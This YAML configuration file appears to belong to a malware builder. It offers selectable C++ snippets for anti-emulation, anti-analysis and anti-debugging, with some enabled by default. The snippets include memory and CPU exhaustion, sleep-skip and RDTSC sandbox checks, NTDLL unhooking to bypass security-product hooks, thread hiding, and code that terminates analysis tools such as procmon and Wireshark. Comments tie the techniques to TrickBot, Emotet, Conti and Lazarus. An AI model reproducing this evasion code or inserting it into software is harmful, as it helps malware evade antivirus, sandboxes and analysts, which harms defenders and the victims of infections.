sections:
- header: Anti Emulation
  template: antiemulation
  display: Anti-Emulation
  allowMultiple: true
  items:
  - id: None
    display: None (Skip)
    default: false
    snippet: |
      // No anti-emulation

  - id: SirAllocALot
    display: SirAllocALot (Memory Exhaustion)
    default: true
    inputs:
    - id: sir_alloc_count
      label: "Allocation Count"
      type: textbox
      defaultValue: "200"
      placeholder: "200"
    - id: sir_iteration_count
      label: "Iterations"
      type: textbox
      defaultValue: "3"
      placeholder: "3"
    - id: sir_alloc_size
      label: "Alloc Size (bytes)"
      type: textbox
      defaultValue: "4096"
      placeholder: "4096"
    snippet: |
      // Anti-emulation: Memory Allocation Exhaustion (SirAllocALot)
      // Floods the emulator with VirtualAlloc calls across multiple iterations.
      // AV emulators have finite memory and API-call budgets — this overflows both.
      // Technique seen in: TrickBot, Ursnif, Emotet and many others.
      {
          const int  COUNT  = $sir_alloc_count$;
          const int  ITERS  = $sir_iteration_count$;
          const int  SIZE   = $sir_alloc_size$;
          void**     allocs = new void*[COUNT]{};
          DWORD      prot;

          for (int i = 0; i < ITERS; i++) {
              // Allocate and dirty every page to force real memory pressure
              for (int n = 0; n < COUNT; n++) {
                  allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                  if (allocs[n]) {
                      volatile BYTE* p = (BYTE*)allocs[n];
                      for (int j = 0; j < SIZE; j += 256) p[j] = (BYTE)(j ^ i ^ n);
                  }
              }
              // Flip all pages to RX — triggers emulator permission-change tracking
              for (int n = 0; n < COUNT; n++)
                  if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);
              // Free all
              for (int n = 0; n < COUNT; n++)
                  if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
          }
          delete[] allocs;
      }

  - id: TimeRawKernel
    display: Kernel Time Busy-Wait (KUSER_SHARED_DATA)
    default: false
    inputs:
    - id: time_raw_kernel_ms
      label: "Delay (ms)"
      type: textbox
      defaultValue: "3000"
      placeholder: "3000"
    snippet: |
      // Anti-emulation: Busy-wait using the kernel time register in KUSER_SHARED_DATA.
      // Reads TickCount directly from the read-only shared user page at 0x7FFE0000.
      // Completely bypasses Sleep() / NtDelayExecution hooks — no API calls made.
      // Formula: ms = (TickCount.LowPart * TickCountMultiplier) >> 24  (= GetTickCount())
      {
          auto get_ms = []() -> DWORD {
              ULONG mult  = *(volatile ULONG*)0x7ffe0004;  // KUSER_SHARED_DATA.TickCountMultiplier
              ULONG ticks = *(volatile ULONG*)0x7ffe0320;  // KUSER_SHARED_DATA.TickCount.LowPart
              return (DWORD)(((ULONGLONG)ticks * mult) >> 24);
          };

          DWORD start = get_ms();
          while ((get_ms() - start) < (DWORD)$time_raw_kernel_ms$) {}
      }

  - id: NtDelayExecution
    display: NtDelayExecution (Direct NTAPI Delay)
    default: false
    inputs:
    - id: nt_delay_seconds
      label: "Delay (seconds)"
      type: textbox
      defaultValue: "5"
      placeholder: "5"
    snippet: |
      // Anti-emulation: Delay via NtDelayExecution — harder to hook than Sleep().
      // Passes a negative LARGE_INTEGER (relative time expressed in 100ns intervals).
      // Used by Conti, Emotet, and many modern loaders as a reliable stalling primitive.
      {
          typedef NTSTATUS (NTAPI* pfnNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER Interval);
          LARGE_INTEGER delay = {};
          delay.QuadPart = -((LONGLONG)$nt_delay_seconds$ * 10000000LL);  // seconds to 100ns (negative = relative)
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              auto fn = (pfnNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
              if (fn) fn(FALSE, &delay);
          }
      }

  - id: HeavyComputation
    display: Heavy Computation (CPU Cycle Exhaustion)
    default: false
    inputs:
    - id: heavy_comp_iterations
      label: "Iterations"
      type: textbox
      defaultValue: "100000000"
      placeholder: "100000000"
    snippet: |
      // Anti-emulation: CPU cycle exhaustion — most emulators cap instruction counts.
      // Mixes rotation, XOR, and prime multiplication so the loop resists optimization.
      // Technique observed in Lazarus Group loaders and various nation-state implants.
      {
          volatile ULONG r = 0xDEADBEEF;
          for (ULONG i = 0; i < (ULONG)$heavy_comp_iterations$; i++) {
              r = (r << 1) | (r >> 31);    // rotate left 1
              r ^= i;
              r = (r * 1000003UL) + 13UL;  // prime multiplier keeps distribution wide
          }
          if (r == 0) Sleep(1);  // opaque use prevents dead-code elimination
      }

  - id: FlsCallbacks
    display: FLS Callback Abuse
    default: false
    snippet: |
      // Anti-emulation: Verify FLS (Fiber Local Storage) callbacks execute correctly.
      // Many AV emulators do not properly implement the FLS destructor callback mechanism.
      // If the callback is never fired after FlsFree(), we are likely being emulated.
      // Technique documented by: Checkpoint Research, BlackHat 2019.
      {
          volatile BOOL called = FALSE;
          auto cb = [](PVOID data) -> VOID {
              *(volatile BOOL*)data = TRUE;
          };

          DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
          if (idx != FLS_OUT_OF_INDEXES) {
              FlsSetValue(idx, (PVOID)&called);
              FlsFree(idx);
              if (!called) ExitProcess(0);  // callback was never invoked — emulator detected
          }
      }

  - id: RdtscTiming
    display: RDTSC Cycle Timing Check
    default: false
    includes: "#include <intrin.h>"
    inputs:
    - id: rdtsc_min_cycles
      label: "Min Expected Cycles"
      type: textbox
      defaultValue: "500000"
      placeholder: "500000"
    snippet: |
      // Anti-emulation: RDTSC timing check — emulators run orders of magnitude slower.
      // We measure the CPU cycle cost of a known workload. On bare metal this is fast;
      // inside an emulator the same work takes far fewer "emulated" cycles,
      // or the counter behaves inconsistently across the emulated instruction stream.
      {
          volatile ULONG work = 0;
          unsigned __int64 t1 = __rdtsc();
          for (volatile int i = 0; i < 100000; i++) work += (ULONG)i;
          unsigned __int64 t2 = __rdtsc();
          if ((t2 - t1) < (unsigned __int64)$rdtsc_min_cycles$) {
              ExitProcess(0);  // cycle delta is impossibly small — emulator detected
          }
      }

  - id: SleepSkipCheck
    display: Sleep Skip Detection
    default: false
    inputs:
    - id: sleep_check_ms
      label: "Sleep Duration (ms)"
      type: textbox
      defaultValue: "1500"
      placeholder: "1500"
    snippet: |
      // Anti-emulation: Detect if Sleep() was fast-forwarded by a sandbox/emulator.
      // Emulators and sandboxes commonly patch Sleep() to return immediately in order
      // to speed up analysis. We verify via QueryPerformanceCounter that real time passed.
      {
          LARGE_INTEGER freq, t1, t2;
          QueryPerformanceFrequency(&freq);
          QueryPerformanceCounter(&t1);
          Sleep($sleep_check_ms$);
          QueryPerformanceCounter(&t2);
          DWORD elapsed_ms = (DWORD)(((t2.QuadPart - t1.QuadPart) * 1000LL) / freq.QuadPart);
          if (elapsed_ms < (DWORD)($sleep_check_ms$ / 2)) {
              ExitProcess(0);  // sleep was skipped — sandbox/emulator detected
          }
      }
- header: Anti Analysis
  template: antianalysis
  display: Anti-Analysis
  allowMultiple: true
  items:
  - id: HideThread
    display: Hide From Debugger
    default: true
    snippet: |
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0);
      }
  - id: TerminateAnalysis
    display: Terminate Analysis Tools
    default: false
    snippet: |
      {
          const wchar_t* targets[] = {
              L"procmon.exe", L"procexp.exe", L"wireshark.exe", 
              L"fiddler.exe", L"ProcessHacker.exe"
          };
          
          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (snap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe = {sizeof(pe)};
              if (Process32FirstW(snap, &pe)) {
                  do {
                      for (int i = 0; i < 5; i++) {
                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                              if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
                          }
                      }
                  } while (Process32NextW(snap, &pe));
              }
              CloseHandle(snap);
          }
      }

  - id: KillAnalysisTools
    display: Terminate Analysis Processes
    default: true
    snippet: |
      // Actively terminate analysis tools
      {
          const wchar_t* targets[] = {
              L"procmon.exe", L"procexp.exe", L"procexp64.exe",
              L"Wireshark.exe", L"fiddler.exe", L"tcpview.exe",
              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
              L"ProcessHacker.exe", L"perfmon.exe"
          };
          
          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (snap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe = {sizeof(pe)};
              if (Process32FirstW(snap, &pe)) {
                  do {
                      for (int i = 0; i < 11; i++) {
                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                              if (hp) {
                                  TerminateProcess(hp, 0);
                                  CloseHandle(hp);
                              }
                          }
                      }
                  } while (Process32NextW(snap, &pe));
              }
              CloseHandle(snap);
          }
      }

  - id: UnhookNtdll
    display: NTDLL Unhooking
    default: false
    snippet: |
      // Unhook NTDLL by mapping fresh copy from disk
      {
          HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 
                                     GENERIC_READ, FILE_SHARE_READ, NULL, 
                                     OPEN_EXISTING, 0, NULL);
          if (hFile != INVALID_HANDLE_VALUE) {
              HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
              if (hMap) {
                  PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
                  if (pClean) {
                      HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                      PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
                      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
                      
                      PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                      for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                          if (memcmp(pSec[i].Name, ".text", 5) == 0) {
                              DWORD oldProt;
                              PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);
                              PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);
                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
                              memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);
                              break;
                          }
                      }
                      UnmapViewOfFile(pClean);
                  }
                  CloseHandle(hMap);
              }
              CloseHandle(hFile);
          }
      }

  - id: HideFromDebugger
    display: Hide Thread From Debugger
    default: false
    snippet: |
      // Use NtSetInformationThread to hide from debugger
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) {
              // ThreadHideFromDebugger = 0x11
              NtSIT(GetCurrentThread(), 0x11, NULL, 0);
          }
      }
- header: Anti Debugging
  template: antidebugging
  display: Anti-Debugging
  allowMultiple: true
  items:
  - id: None
    display: None (Skip)
    default: false
    snippet: |
      // No anti-debugging
  - id: IsDebuggerPresent
    display: IsDebuggerPresent API
    default: true
    snippet: |
      // Anti-debug: Check IsDebuggerPresent
      if (IsDebuggerPresent()) {
          return 0;
      }
  - id: CheckRemoteDebuggerPresent
    display: CheckRemoteDebuggerPresent API
    default: false
    snippet: |
      // Anti-debug: Check for remote debugger
      {
          BOOL debuggerPresent = FALSE;
          if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
              if (debuggerPresent) {
                  return 0;
              }
          }
      }
  - id: PebBeingDebugged
    display: PEB BeingDebugged Flag
    default: false
    snippet: |
      // Anti-debug: Direct PEB check
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          #endif
          if (pPeb->BeingDebugged) {
              return 0;
          }
      }
  - id: NtGlobalFlag
    display: NtGlobalFlag Check
    default: false
    snippet: |
      // Anti-debug: Check NtGlobalFlag in PEB
      // Debuggers set heap flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
      {
          #ifdef _WIN64
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
          #else
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
          #endif
          if (*pNtGlobalFlag & 0x70) { // FLG_HEAP_* flags
              return 0;
          }
      }
  - id: HeapFlags
    display: Heap Flags Check
    default: false
    snippet: |
      // Anti-debug: Check heap flags set by debugger
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
          #endif
          if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
              return 0;
          }
      }
  - id: CloseHandleException
    display: CloseHandle Invalid Handle
    default: false
    snippet: |
      // Anti-debug: CloseHandle with invalid handle causes exception under debugger
      __try {
          CloseHandle((HANDLE)0xDEADBEEF);
      }
      __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
          // Exception caught = debugger present
          return 0;
      }
  - id: OutputDebugString
    display: OutputDebugString Error Check
    default: false
    snippet: |
      // Anti-debug: OutputDebugString sets error differently when debugger present
      {
          SetLastError(0);
          OutputDebugStringA("Test");
          if (GetLastError() == 0) {
              // Debugger consumed the string
              return 0;
          }
      }
  - id: HardwareBreakpoints
    display: Hardware Breakpoints Detection
    default: false
    snippet: |
      // Anti-debug: Check for hardware breakpoints via debug registers
      {
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                  return 0;
              }
          }
      }
  - id: TimingRdtsc
    display: RDTSC Timing Check
    default: false
    snippet: |
      // Anti-debug: Timing check using RDTSC
      // Debugger stepping causes significant delay
      {
          unsigned __int64 start = __rdtsc();
          
          // Small operation
          volatile int x = 0;
          for (int i = 0; i < 100; i++) x++;
          
          unsigned __int64 end = __rdtsc();
          
          // Threshold for normal execution (adjust based on CPU)
          if ((end - start) > 0x100000) {
              return 0;
          }
      }

  - id: NtQueryInformationProcess
    display: NtQueryInformationProcess Debug Port
    default: false
    snippet: |
      // Anti-debug: Query debug port via NtQueryInformationProcess
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  HANDLE debugPort = NULL;
                  NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL); // ProcessDebugPort = 7
                  if (status == 0 && debugPort != NULL) {
                      return 0;
                  }
              }
          }
      }
  - id: ParentProcessCheck
    display: Parent Process Check
    default: false
    snippet: |
      // Anti-debug: Check if parent process is a known debugger
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
                  if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
                      HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
                      if (hParent) {
                          WCHAR parentName[MAX_PATH] = {0};
                          DWORD size = MAX_PATH;
                          if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
                              _wcslwr_s(parentName, MAX_PATH);
                              if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
                                  wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
                                  wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
                                  CloseHandle(hParent);
                                  return 0;
                              }
                          }
                          CloseHandle(hParent);
                      }
                  }
              }
          }
      }
  - id: TrapFlag
    display: Trap Flag Detection
    default: false
    snippet: |
      // Anti-debug: Single-step trap flag detection
      #ifdef _M_IX86
      __try {
          __asm {
              pushfd
              or dword ptr [esp], 0x100 ; Set trap flag
              popfd
              nop
          }
      }
      __except(EXCEPTION_EXECUTE_HANDLER) {
          goto trap_ok;
      }
      return 0;
      trap_ok:;
      #else
      // x64: Use NtSetInformationThread to hide from debugger
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0); // ThreadHideFromDebugger
      }
      #endif
  - id: FullAntiDebug
    display: Full Anti-Debug Suite
    default: true
    snippet: |
      // Complete anti-debug implementation
      {
          // 1. IsDebuggerPresent
          if (IsDebuggerPresent()) ExitProcess(0);
          
          // 2. CheckRemoteDebuggerPresent
          BOOL remote = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
          if (remote) ExitProcess(0);
          
          // 3. PEB flags
          #ifdef _WIN64
          PPEB peb = (PPEB)__readgsqword(0x60);
          DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);
          #else
          PPEB peb = (PPEB)__readfsdword(0x30);
          DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);
          #endif
          if (peb->BeingDebugged) ExitProcess(0);
          if (ntg & 0x70) ExitProcess(0);
          
          // 4. Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          GetThreadContext(GetCurrentThread(), &ctx);
          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
          
          // 5. RDTSC timing
          unsigned __int64 t1 = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t1 > 0x100000) ExitProcess(0);
          
          // 6. Debug port
          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
          if (NtQIP) {
              HANDLE port = NULL;
              NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);
              if (port) ExitProcess(0);
              
              ULONG flags = 0;
              NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags
              if (flags == 0) ExitProcess(0);
          }
          
          // 7. OutputDebugString
          SetLastError(0);
          OutputDebugStringA("X");
          if (GetLastError() == 0) ExitProcess(0);
      }

  - id: AllChecks
    display: All Anti-Debug Checks
    default: true
    snippet: |
      // Comprehensive anti-debugging
      {
          // API checks
          if (IsDebuggerPresent()) ExitProcess(0);
          BOOL dbg = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
          if (dbg) ExitProcess(0);

          // PEB checks
          #ifdef _WIN64
          PPEB peb = (PPEB)__readgsqword(0x60);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0xBC);
          #else
          PPEB peb = (PPEB)__readfsdword(0x30);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0x68);
          #endif
          if (peb->BeingDebugged) ExitProcess(0);
          if (*ntg & 0x70) ExitProcess(0);

          // Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          GetThreadContext(GetCurrentThread(), &ctx);
          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);

          // Timing check
          unsigned __int64 t = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t > 0x100000) ExitProcess(0);

          // Debug port
          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
          if (NtQIP) {
              HANDLE port = NULL;
              if (NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port) ExitProcess(0);
          }
      }
  - id: LayeredChecks
    display: Layered Debugger Detection
    default: true
    snippet: |
      // Multiple anti-debug checks
      {
          // Check 1: IsDebuggerPresent
          if (IsDebuggerPresent()) return 0;

          // Check 2: Remote debugger
          BOOL remote = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
          if (remote) return 0;

          // Check 3: PEB flag
          #ifdef _WIN64
          if (((PPEB)__readgsqword(0x60))->BeingDebugged) return 0;
          #else
          if (((PPEB)__readfsdword(0x30))->BeingDebugged) return 0;
          #endif

          // Check 4: Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;
          }

          // Check 5: Timing
          unsigned __int64 t1 = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t1 > 0x100000) return 0;
      }
